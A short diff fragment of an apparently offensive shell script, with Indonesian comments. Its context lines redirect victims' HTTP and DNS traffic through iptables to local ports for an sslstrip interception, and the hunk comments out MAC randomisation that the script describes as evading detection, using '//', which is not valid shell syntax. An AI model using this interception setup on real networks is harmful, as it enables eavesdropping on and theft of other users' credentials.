@@ -90,10 +90,10 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5353
 
 # Menyamarkan MAC Address agar sulit dideteksi
-ifconfig $interface down
-macchanger -r $interface
-ifconfig $interface up
-echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"
+// ifconfig $interface down
+// macchanger -r $interface
+// ifconfig $interface up
+// echo -e "$green[✔] MAC Address diacak untuk menghindari deteksi"
 
 # Pastikan sslstrip log ada sebelum tailing
 touch sslstrip.log
